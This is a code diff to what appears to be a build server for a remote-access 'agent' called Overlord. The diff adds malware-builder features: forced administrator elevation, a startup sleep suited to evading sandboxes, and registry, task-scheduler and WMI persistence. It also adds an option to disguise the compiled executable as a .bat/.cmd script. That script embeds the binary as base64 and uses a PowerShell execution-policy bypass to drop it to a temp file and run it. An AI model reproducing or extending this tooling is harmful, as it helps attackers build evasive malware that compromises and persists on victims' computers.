@@ -78,6 +78,9 @@ type BuildProcessConfig = {
   iconBase64?: string;
   enableUpx?: boolean;
   upxStripHeaders?: boolean;
+  requireAdmin?: boolean;
+  outputExtension?: string;
+  sleepSeconds?: number;
 };
 
 async function checkUpxAvailable(sendToStream: (data: any) => void): Promise<boolean> {
@@ -297,7 +300,7 @@ export async function startBuildProcess(
       upxBin = "upx";
     }
 
-    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64);
+    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64 || config.requireAdmin);
     const hasWindowsTargets = platformsToBuild.some((p) => p.startsWith("windows-"));
 
     if (hasAssemblyData && hasWindowsTargets) {
@@ -364,6 +367,7 @@ export async function startBuildProcess(
             }
 
             const versionStr = config.assemblyVersion || "0.0.0.0";
+            const winExt = config.outputExtension || ".exe";
             const versionInfo: any = {
               "0409": {
                 "FileDescription": config.assemblyTitle || "",
@@ -372,7 +376,7 @@ export async function startBuildProcess(
                 "FileVersion": versionStr,
                 "ProductVersion": versionStr,
                 "LegalCopyright": config.assemblyCopyright || "",
-                "OriginalFilename": config.outputName ? (config.outputName + ".exe") : "",
+                "OriginalFilename": config.outputName ? (config.outputName + winExt) : "",
               },
             };
 
@@ -389,6 +393,31 @@ export async function startBuildProcess(
             };
 
             const winresJsonPath = path.join(winresTempDir, "winres.json");
+            if (config.requireAdmin) {
+              winresConfig["RT_MANIFEST"] = {
+                "#1": {
+                  "0000": {
+                    "identity": {},
+                    "description": "",
+                    "minimum-os": "vista",
+                    "execution-level": "requireAdministrator",
+                    "ui-access": false,
+                    "auto-elevate": false,
+                    "dpi-awareness": "system",
+                    "disable-theming": false,
+                    "disable-window-filtering": false,
+                    "high-resolution-scrolling-aware": false,
+                    "ultra-high-resolution-scrolling-aware": false,
+                    "long-path-aware": false,
+                    "printer-driver-isolation": false,
+                    "gdi-scaling": false,
+                    "segment-heap": false,
+                    "use-common-controls-v6": false,
+                  },
+                },
+              };
+              sendToStream({ type: "output", text: "UAC manifest: requireAdministrator\n", level: "info" });
+            }
             fs.writeFileSync(winresJsonPath, JSON.stringify(winresConfig, null, 2));
             sendToStream({ type: "output", text: `Winres config: ${winresJsonPath}\n`, level: "info" });
 
@@ -426,8 +455,9 @@ export async function startBuildProcess(
       const actualArch = goarm ? "arm" : arch;
       const targetKey = `${os}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
       const namePrefix = config.outputName || "agent";
+      const winExt = config.outputExtension || ".exe";
       const outputName = deps.sanitizeOutputName(
-        platform.includes("windows") ? `${namePrefix}-${platform}.exe` : `${namePrefix}-${platform}`,
+        platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
       );
 
       sendToStream({ type: "status", text: `Building ${platform}...` });
@@ -539,6 +569,12 @@ export async function startBuildProcess(
         ldflags = ldflags ? `${ldflags} ${buildTagFlag}` : buildTagFlag;
       }
 
+      if (config.sleepSeconds && config.sleepSeconds > 0) {
+        const sleepFlag = `-X overlord-client/cmd/agent/config.DefaultSleepSeconds=${config.sleepSeconds}`;
+        ldflags = ldflags ? `${ldflags} ${sleepFlag}` : sleepFlag;
+        sendToStream({ type: "output", text: `Startup sleep: ${config.sleepSeconds}s\n`, level: "info" });
+      }
+
       if (config.hideConsole && os === "windows") {
         const hideConsoleFlag = "-H=windowsgui";
         ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
@@ -564,7 +600,16 @@ export async function startBuildProcess(
 
       try {
         const buildTool = config.obfuscate ? "garble" : "go";
-        const tagArg = config.noPrinting ? "-tags noprint " : "";
+        const buildTags: string[] = [];
+        if (config.noPrinting) buildTags.push("noprint");
+        if (config.enablePersistence && os === "windows") {
+          const method = config.persistenceMethod || "startup";
+          if (method === "registry") buildTags.push("persist_registry");
+          else if (method === "taskscheduler") buildTags.push("persist_taskscheduler");
+          else if (method === "wmi") buildTags.push("persist_wmi");
+          // startup method uses the default no-op persistInstallFn — no tag needed
+        }
+        const tagArg = buildTags.length > 0 ? `-tags "${buildTags.join(" ")}" ` : "";
         logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
         logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}`);
 
@@ -576,7 +621,7 @@ export async function startBuildProcess(
         }
 
         const buildArgs: string[] = [];
-        if (config.noPrinting) buildArgs.push("-tags", "noprint");
+        if (buildTags.length > 0) buildArgs.push("-tags", buildTags.join(" "));
         if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
         buildArgs.push("-o", `${outDir}/${outputName}`, "./cmd/agent");
 
@@ -613,6 +658,9 @@ export async function startBuildProcess(
 
         const filePath = `${outDir}/${outputName}`;
         let finalSize = Bun.file(filePath).size;
+        // For .bat/.cmd: go build writes a PE binary; UPX must run first (it needs PE format),
+        // then after compression we wrap it in a batch script with an embedded base64 payload.
+        const isBatWrapper = os === "windows" && (winExt === ".bat" || winExt === ".cmd");
 
         if (upxBin) {
           sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
@@ -639,6 +687,46 @@ export async function startBuildProcess(
             }
           } catch (upxErr: any) {
             sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
+          }
+        }
+
+        if (isBatWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as ${winExt} script...\n`, level: "info" });
+          try {
+            const exeBytes = fs.readFileSync(filePath);
+            const b64 = exeBytes.toString("base64");
+            // Split into 76-char lines so the bat file stays manageable
+            const b64Lines = b64.match(/.{1,76}/g) || [b64];
+            // Random marker generated at build time using the same uuid util already imported
+            const marker = `:OVD_${uuidv4().replace(/-/g, "").substring(0, 16).toUpperCase()}`;
+            // PowerShell payload: reads this script via %_OVD_SELF%, strips the marker+data,
+            // decodes base64 to a temp .exe, launches it, then exits.
+            const psCmd = [
+              `$f=$env:_OVD_SELF;`,
+              `$l=[IO.File]::ReadAllLines($f);`,
+              `$i=0;`,
+              `for($j=0;$j-lt$l.Count;$j++){if($l[$j] -ceq '${marker}'){$i=$j+1;break}};`,
+              `$b=[Convert]::FromBase64String(($l[$i..($l.Count-1)]-join''));`,
+              `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
+              `[IO.File]::WriteAllBytes($t,$b);`,
+              `Start-Process $t;`,
+              `exit`,
+            ].join("");
+            const wrapper = [
+              `@echo off`,
+              `setlocal`,
+              `set "_OVD_SELF=%~f0"`,
+              `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
+              `endlocal`,
+              `exit /b 0`,
+              marker,
+              ...b64Lines,
+            ].join("\r\n") + "\r\n";
+            fs.writeFileSync(filePath, wrapper, "utf8");
+            finalSize = fs.statSync(filePath).size;
+            sendToStream({ type: "output", text: `Wrapped: ${exeBytes.length} byte PE → ${finalSize} byte ${winExt} script\n`, level: "info" });
+          } catch (wrapErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Failed to generate bat wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
           }
         }
 
